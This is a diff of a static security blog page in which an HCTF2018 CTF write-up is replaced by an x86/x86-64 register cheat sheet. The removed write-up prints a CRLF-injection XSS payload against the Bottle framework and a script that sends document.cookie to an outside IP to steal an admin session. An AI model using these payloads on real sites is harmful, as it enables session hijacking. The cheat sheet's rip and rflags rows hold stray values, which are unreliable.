@@ -23,27 +23,21 @@
     var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="HCTF2018 bottle writeup.">
+  <meta name="description" content="Common registers cheat sheets.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HCTF2018 Bottle Writeup">
-<meta property="og:url" content="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/index.html">
+<meta property="og:title" content="Register CheatSheet">
+<meta property="og:url" content="https://srpopty.github.io/2021/08/10/Register-CheatSheet/index.html">
 <meta property="og:site_name" content="Shadow Gallery">
-<meta property="og:description" content="HCTF2018 bottle writeup.">
+<meta property="og:description" content="Common registers cheat sheets.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/4V@3FC@51J0E9XXG-1024x269.png">
-<meta property="og:image" content="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112190926-1024x547.png">
-<meta property="og:image" content="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112191129-1024x280.png">
-<meta property="og:image" content="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/U5Z7A0TGDGISN5ZXKH_J.png">
-<meta property="og:image" content="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193243.png">
-<meta property="og:image" content="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193331-1024x384.png">
-<meta property="article:published_time" content="2018-11-12T12:23:58.000Z">
-<meta property="article:modified_time" content="2020-08-11T08:44:44.331Z">
+<meta property="article:published_time" content="2021-08-10T11:07:22.000Z">
+<meta property="article:modified_time" content="2021-08-10T11:20:40.092Z">
 <meta property="article:author" content="Srpopty">
-<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="CheatSheet">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/4V@3FC@51J0E9XXG-1024x269.png">
 
-<link rel="canonical" href="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/">
+<link rel="canonical" href="https://srpopty.github.io/2021/08/10/Register-CheatSheet/">
 
 
 <script id="page-configurations">
@@ -55,7 +49,7 @@
   };
 </script>
 
-  <title>HCTF2018 Bottle Writeup | Shadow Gallery</title>
+  <title>Register CheatSheet | Shadow Gallery</title>
   
 
 
@@ -172,7 +166,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
-    <link itemprop="mainEntityOfPage" href="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/">
+    <link itemprop="mainEntityOfPage" href="https://srpopty.github.io/2021/08/10/Register-CheatSheet/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -185,7 +179,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          HCTF2018 Bottle Writeup
+          Register CheatSheet
         </h1>
 
         <div class="post-meta">
@@ -194,28 +188,22 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2018-11-12 20:23:58" itemprop="dateCreated datePublished" datetime="2018-11-12T20:23:58+08:00">2018-11-12</time>
+              <time title="Created: 2021-08-10 19:07:22 / Modified: 19:20:40" itemprop="dateCreated datePublished" datetime="2021-08-10T19:07:22+08:00">2021-08-10</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-08-11 16:44:44" itemprop="dateModified" datetime="2020-08-11T16:44:44+08:00">2020-08-11</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/Hack/" itemprop="url" rel="index"><span itemprop="name">Hack</span></a>
                 </span>
             </span>
 
           
-            <div class="post-description">HCTF2018 bottle writeup.</div>
+            <div class="post-description">Common registers cheat sheets.</div>
 
         </div>
       </header>
@@ -226,30 +214,243 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="Bottle"><a href="#Bottle" class="headerlink" title="Bottle"></a>Bottle</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Not hard, I believe you are the lucky one!</span><br><span class="line">hint1: *&#x2F;3 *&#x2F;10 </span><br><span class="line">hint2: bot use firefoxDriver</span><br><span class="line">URL http:&#x2F;&#x2F;bottle.2018.hctf.io</span><br></pre></td></tr></table></figure>
-
-<p>后端是个python，根据题目可知这个应用使用了bottle框架开发。应用功能是提交一个网址，但是经过测试发现不管提交什么网址都没有任何反应，目测可能只能提交本域名下的网址。</p>
-<p>登录与注册的时候发现中间经过了一个path跳转<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/4V@3FC@51J0E9XXG-1024x269.png"></p>
-<p>bottle框架比较出名一点的漏洞是HTTP头注入漏洞(CVE-2016-9964)<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112190926-1024x547.png"></p>
-<p>在path跳转时可进行CRLF注入<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112191129-1024x280.png"></p>
-<p>所以思路是利用CRLF注入，将XSS内容写入到body中，将这个网址提交给管理员，管理员访问这个网址，触发XSS达到cookie</p>
-<p>这里有一个问题:当浏览器发现Location可以跳转时，将不会对body中的HTML进行渲染而直接跳转，只有Location为空时才不会跳转。但是此题中Location又不能为空(会500)，因此当管理员访问这个网址时肯定会跳转。不过Hint中提到”bot use firefoxDriver”，而在FireFox中，当Location目标网址的端口小于80时不会对Location跳转</p>
-<p>因此构造网址如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io:0&#x2F;%0A%0D%0A%0D%3Cscript%3Ea&#x3D;1%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure>
-
-<p>注意到题目中还设置了CSP</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</span><br></pre></td></tr></table></figure>
-<p>后来出题人再修复此题之后将CSP放在了CRLF注入点的下面，这样就可以直接把CSP挤到body中，浏览器便不会解析CSP</p>
-<p>在本地FireFox中测试<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/U5Z7A0TGDGISN5ZXKH_J.png"><br>这里不使用alert测试是因为当URL中存在引号或括号时会500</p>
-<p>于是将script的src指向自己服务器的js文件即可任意XSS，最终payload如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:0&#x2F;%0A%0D%0A%0D%3Cscript+src&#x3D;http:&#x2F;&#x2F;srpopty.cn&#x2F;1.js%3E%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure>
-
-<p>1.js</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ajax=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">ajax.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://123.206.86.208/xss/&quot;</span>+<span class="built_in">document</span>.cookie,<span class="literal">true</span>);</span><br><span class="line">ajax.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">ajax.send();</span><br></pre></td></tr></table></figure>
-
-<p>拿到管理员的cookie<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193243.png"></p>
-<p>修改cookie登录拿到flag<br><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193331-1024x384.png"></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p>
+        <h1 id="0x0-x86-32bit"><a href="#0x0-x86-32bit" class="headerlink" title="0x0 x86-32bit"></a>0x0 x86-32bit</h1><table>
+<thead>
+<tr>
+<th align="center">register</th>
+<th align="center">Lower 16 bits</th>
+<th align="center">High 8 bits of lower 16 bits</th>
+<th align="center">Low 8 bits of lower 16 bits</th>
+<th align="center">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">eax</td>
+<td align="center">ax</td>
+<td align="center">ah</td>
+<td align="center">al</td>
+<td align="center">accumulator</td>
+</tr>
+<tr>
+<td align="center">ebx</td>
+<td align="center">bx</td>
+<td align="center">bh</td>
+<td align="center">bl</td>
+<td align="center">base register</td>
+</tr>
+<tr>
+<td align="center">ecx</td>
+<td align="center">cx</td>
+<td align="center">ch</td>
+<td align="center">cl</td>
+<td align="center">counter register</td>
+</tr>
+<tr>
+<td align="center">edx</td>
+<td align="center">dx</td>
+<td align="center">dh</td>
+<td align="center">dl</td>
+<td align="center">data register - can be used for I/O port access and arithmetic functions</td>
+</tr>
+<tr>
+<td align="center">esi</td>
+<td align="center">si</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">source index register</td>
+</tr>
+<tr>
+<td align="center">edi</td>
+<td align="center">di</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">destination index register</td>
+</tr>
+<tr>
+<td align="center">ebp</td>
+<td align="center">bp</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">base pointer register</td>
+</tr>
+<tr>
+<td align="center">esp</td>
+<td align="center">sp</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">Stack pointer</td>
+</tr>
+<tr>
+<td align="center">eip</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">instruction pointer</td>
+</tr>
+<tr>
+<td align="center">flags</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">flags</td>
+</tr>
+</tbody></table>
+<h1 id="0x1-x86-64bit"><a href="#0x1-x86-64bit" class="headerlink" title="0x1 x86-64bit"></a>0x1 x86-64bit</h1><table>
+<thead>
+<tr>
+<th align="center">register</th>
+<th align="center">Lower 32 bits</th>
+<th align="center">Lower 16 bits</th>
+<th align="center">High 8 bits of lower 16 bits</th>
+<th align="center">Low 8 bits of lower 16 bits</th>
+<th align="center">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">rax</td>
+<td align="center">eax</td>
+<td align="center">ax</td>
+<td align="center">ah</td>
+<td align="center">al</td>
+<td align="center">accumulator</td>
+</tr>
+<tr>
+<td align="center">rbx</td>
+<td align="center">ebx</td>
+<td align="center">bx</td>
+<td align="center">bh</td>
+<td align="center">bl</td>
+<td align="center">base register</td>
+</tr>
+<tr>
+<td align="center">rcx</td>
+<td align="center">ecx</td>
+<td align="center">cx</td>
+<td align="center">ch</td>
+<td align="center">cl</td>
+<td align="center">counter register</td>
+</tr>
+<tr>
+<td align="center">rdx</td>
+<td align="center">edx</td>
+<td align="center">dx</td>
+<td align="center">dh</td>
+<td align="center">dl</td>
+<td align="center">data register - can be used for I/O port access and arithmetic functions</td>
+</tr>
+<tr>
+<td align="center">rsi</td>
+<td align="center">esi</td>
+<td align="center">si</td>
+<td align="center"></td>
+<td align="center">sil</td>
+<td align="center">source index register</td>
+</tr>
+<tr>
+<td align="center">rdi</td>
+<td align="center">edi</td>
+<td align="center">di</td>
+<td align="center"></td>
+<td align="center">dil</td>
+<td align="center">destination index register</td>
+</tr>
+<tr>
+<td align="center">rbp</td>
+<td align="center">ebp</td>
+<td align="center">bp</td>
+<td align="center"></td>
+<td align="center">bpl</td>
+<td align="center">base pointer register</td>
+</tr>
+<tr>
+<td align="center">rsp</td>
+<td align="center">esp</td>
+<td align="center">sp</td>
+<td align="center"></td>
+<td align="center">spl</td>
+<td align="center">Stack pointer</td>
+</tr>
+<tr>
+<td align="center">r8</td>
+<td align="center">r8d</td>
+<td align="center">r8w</td>
+<td align="center"></td>
+<td align="center">r8b</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">r9</td>
+<td align="center">r9d</td>
+<td align="center">r9w</td>
+<td align="center"></td>
+<td align="center">r9b</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">r10</td>
+<td align="center">r10d</td>
+<td align="center">r10w</td>
+<td align="center"></td>
+<td align="center">r10b</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">r11</td>
+<td align="center">r11d</td>
+<td align="center">r11w</td>
+<td align="center"></td>
+<td align="center">r11b</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">r12</td>
+<td align="center">r12d</td>
+<td align="center">r12w</td>
+<td align="center"></td>
+<td align="center">r12b</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">r13</td>
+<td align="center">r13d</td>
+<td align="center">r13w</td>
+<td align="center"></td>
+<td align="center">r13b</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">r14</td>
+<td align="center">r14d</td>
+<td align="center">r14w</td>
+<td align="center"></td>
+<td align="center">r14b</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">r15</td>
+<td align="center">R15d</td>
+<td align="center">r15w</td>
+<td align="center"></td>
+<td align="center">r15b</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">rip</td>
+<td align="center"></td>
+<td align="center">0x09</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">instruction pointer</td>
+</tr>
+<tr>
+<td align="center">rflags</td>
+<td align="center"></td>
+<td align="center">0x0a</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">flags</td>
+</tr>
+</tbody></table>
 
     </div>
 
@@ -259,7 +460,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+              <a href="/tags/CheatSheet/" rel="tag"># CheatSheet</a>
           </div>
 
         
@@ -268,13 +470,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2018/10/28/Seccon2018-GhostKingdom-Writeup/" rel="prev" title="Seccon2018 GhostKingdom Writeup">
-      <i class="fa fa-chevron-left"></i> Seccon2018 GhostKingdom Writeup
+    <a href="/2020/12/10/XNUCA2020-ezwp-Writeup/" rel="prev" title="X-nuca 2020 ezwp Writeup">
+      <i class="fa fa-chevron-left"></i> X-nuca 2020 ezwp Writeup
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2019/01/27/%E9%92%88%E5%AF%B9%E6%9F%90%E4%B8%89%E6%B5%81%E5%AE%89%E5%85%A8%E5%85%AC%E5%8F%B8%E7%9A%84%E6%B8%97%E9%80%8F/" rel="next" title="针对某三流安全公司的渗透">
-      针对某三流安全公司的渗透 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -335,7 +534,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Bottle"><span class="nav-number">1.</span> <span class="nav-text">Bottle</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-x86-32bit"><span class="nav-number">1.</span> <span class="nav-text">0x0 x86-32bit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-x86-64bit"><span class="nav-number">2.</span> <span class="nav-text">0x1 x86-64bit</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -470,7 +669,7 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
       repo        : 'srpopty.github.io',
       owner       : 'Srpopty',
       admin       : ['Srpopty'],
-      id          : 'e5c41483a31d52b8de5a33362689236a',
+      id          : '4654002f4941a933195df8b7e5b964f0',
         language: 'en',
       distractionFreeMode: true
     });
